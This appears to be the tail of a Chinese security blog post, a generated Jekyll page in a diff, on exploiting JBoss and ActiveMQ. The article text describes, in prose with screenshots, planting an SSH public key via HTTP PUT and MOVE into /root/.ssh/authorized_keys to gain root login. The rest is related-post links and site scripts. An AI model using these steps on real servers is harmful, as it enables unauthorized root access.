+<p>在本地用<code class="highlighter-rouge">ssh-kengen -t RSA</code>生成密钥对，将公钥通过PUT方式利用burpsuit写入到目标机器：</p>
+
+<p><img src="/img/hack/Jboss/1506483063895.png" alt="" /></p>
+
+<p>再利用MOVE方式移动到<code class="highlighter-rouge">/root/.ssh/authorized_keys</code>:</p>
+
+<p><img src="/img/hack/Jboss/1506483127655.png" alt="" /></p>
+
+<p>利用扫描器对对方机器进行ssh的端口扫描，确认使用默认22端口与否，然后使用ssh连接目标机器，且目标机器是root用户。</p>
+
+<h2 id="参考">参考</h2>
+
+<ol>
+  <li><a href="https://paper.seebug.org/312/">深入理解 JAVA 反序列化漏洞</a>:https://paper.seebug.org/312/</li>
+  <li><a href="http://blog.knownsec.com/2013/10/%E7%BB%99jboss%E7%A7%8D%E8%9B%8A%E5%88%86%E6%9E%90/">给jboss种蛊分析</a></li>
+  <li><a href="http://www.cnseay.com/502/">利用JBOSS漏洞拿webshell</a>:http://www.cnseay.com/502/</li>
+  <li><a href="https://paper.seebug.org/346/">Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析</a>:https://paper.seebug.org/346/</li>
+</ol>
+
+        </article>
+        <hr>
+
+        
+        
+            
+            
+                
+                    
+                        
+                        <h2 id="similar_posts">Similar Posts</h2>
+                        <ul>
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/02/08/Shodan-Manual/">Shodan手册
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/30/exploit-domain/">域渗透的整理
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/27/open-RDP/">开启RDP
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/11/30/Test-LAB-11/">TEST LAB 11
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+        
+            </ul>
+        
+
+        <div class="post-recent">
+    <div class="pre">
+        
+        <p><strong>上一篇</strong> <a href="/2017/09/24/RDP-HiJacking/">RDP劫持</a></p>
+        
+    </div>
+    <div class="nex">
+
+        
+        <p><strong>下一篇</strong> <a href="/2017/09/27/hack-skill/">技巧总结1</a></p>
+        
+    </div>
+</div>
+
+
+        <h2 id="comments">Comments</h2>
+        
+
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+
+    var disqus_config = function() {
+        this.page.url = 'http://localhost:4000/2017/09/27/Jboss/'; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://localhost:4000/2017/09/27/Jboss/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document,
+            s = d.createElement('script');
+
+        s.src = '//http-b404-xyz.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+    </div>
+    <button class="anchor"><i class="fa fa-anchor"></i></button>
+    <div class="right">
+        <div class="wrap">
+
+            <!-- Content -->
+            <div class="side content">
+                <div>
+                    Content
+                </div>
+                <ul id="content-side" class="content-ul">
+                    
+                    <li><a href="#similar_posts">Similar Posts</a></li>
+                    
+                    <li><a href="#comments">Comments</a></li>
+                </ul>
+            </div>
+            <!-- 其他div框放到这里 -->
+            <!-- <div class="side">bbbb</div> -->
+        </div>
+    </div>
+</div>
+<script>
+/**
+ * target _blank
+ */
+(function() {
+    var aTags = document.querySelectorAll('article a:not([id])')
+    for (var i = 0; i < aTags.length; i++) {
+        aTags[i].setAttribute('target', '_blank')
+    }
+}());
+</script>
+<script src="/js/pageContent.js " charset="utf-8"></script>
+
+
+    <footer class="site-footer">
+
+
+    <div class="wrapper">
+
+        <p class="description">
+             The quieter you become, the more you can hear. 
+        </p>
+
+        <br>
+        <p class="contact">
+             
+            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
+            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
+            
+        </p>
+        <!--
+        <p>
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        </p>
+    -->
+        <p class="power">
+            <span>
+                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
+            </span>
+        </p>
+    </div>
+</footer>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <div class="back-to-top">
+    <a href="#top" data-scroll>
+        <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+    <script src=" /js/main.js " charset="utf-8"></script>
+    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
+    <script type="text/javascript">
+      smoothScroll.init({
+        speed: 500, // Integer. How fast to complete the scroll in milliseconds
+        easing: 'easeInOutCubic', // Easing pattern to use
+        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
+      });
+    </script>
+    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
+  </body>
+
+</html>
